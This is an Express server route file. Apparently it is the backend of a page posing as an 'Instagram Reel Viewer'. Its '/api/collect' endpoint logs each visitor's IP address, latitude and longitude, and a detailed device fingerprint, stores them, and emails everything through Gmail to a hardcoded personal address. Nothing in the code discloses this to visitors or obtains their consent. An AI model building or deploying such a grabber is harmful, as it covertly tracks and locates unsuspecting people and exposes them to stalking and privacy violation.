import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertUserTrackingDataSchema } from "@shared/schema";
import nodemailer from "nodemailer";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to collect user data
  app.post("/api/collect", async (req, res) => {
    try {
      // Validate request body
      const validationResult = insertUserTrackingDataSchema.safeParse(req.body);
      
      if (!validationResult.success) {
        return res.status(400).json({ 
          message: "Invalid data format",
          errors: validationResult.error.format()
        });
      }
      
      // Add IP address to tracking data
      const ip = getIpAddress(req);
      const trackingData = {
        ...validationResult.data,
        ip
      };
      
      // Save tracking data to storage
      await storage.saveTrackingData(trackingData);
      
      // Send email notification with collected data
      await sendTrackingDataEmail(trackingData);
      
      res.status(200).json({ status: "success" });
    } catch (error) {
      console.error("Error collecting data:", error);
      res.status(500).json({ message: "Internal server error" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}

// Helper function to get IP address from request
function getIpAddress(req: Request): string {
  const forwardedFor = req.headers['x-forwarded-for'];
  
  if (forwardedFor) {
    // If x-forwarded-for header exists, use the first IP in the list
    const ips = Array.isArray(forwardedFor) 
      ? forwardedFor[0] 
      : forwardedFor.split(',')[0].trim();
    return ips;
  }
  
  // Fallback to various other address sources
  return req.headers['x-real-ip'] as string || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress || 
         'Unknown';
}

async function sendTrackingDataEmail(data: any) {
  try {
    // Use your specified email address
    const emailUser = "akki.akshayx@gmail.com";
    const emailPass = process.env.EMAIL_PASS;
    const emailTo = emailUser;
    
    if (!emailPass) {
      console.error("EMAIL_PASS environment variable is not set");
      console.log("Please make sure to set this variable in your Vercel environment variables");
      return;
    }
    
    // Create reusable transporter object using Gmail
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: emailUser,
        pass: emailPass
      },
    });

    // Format all collected data for the email
    const formattedData = Object.entries(data)
      .map(([key, value]) => `${key.charAt(0).toUpperCase() + key.slice(1)}: ${value || "Not available"}`)
      .join('\n');

    // Prepare email content with all detailed information
    const mailOptions = {
      from: emailUser,
      to: emailTo,
      subject: "Complete User Data from Instagram Reel Viewer",
      text: `
COLLECTED USER DATA
===================
IP Address: ${data.ip || "Unknown"}
Location: ${data.latitude}, ${data.longitude}
Device: ${data.userAgent}
Platform: ${data.platform || "Unknown"}
Vendor: ${data.vendor || "Unknown"}
Screen: ${data.screen}
Language: ${data.language}
Battery: ${data.battery || "Not available"}
Cookies Enabled: ${data.cookiesEnabled || "Unknown"}
Do Not Track: ${data.doNotTrack || "Not available"}
Hardware Concurrency: ${data.hardwareConcurrency || "Unknown"}
Device Memory: ${data.deviceMemory || "Unknown"} 
Network Type: ${data.networkType || "Unknown"}
Timestamp: ${new Date().toLocaleString()}

RAW DATA
========
${formattedData}
      `
    };

    // Send email
    await transporter.sendMail(mailOptions);
    console.log("Detailed email sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
  }
}
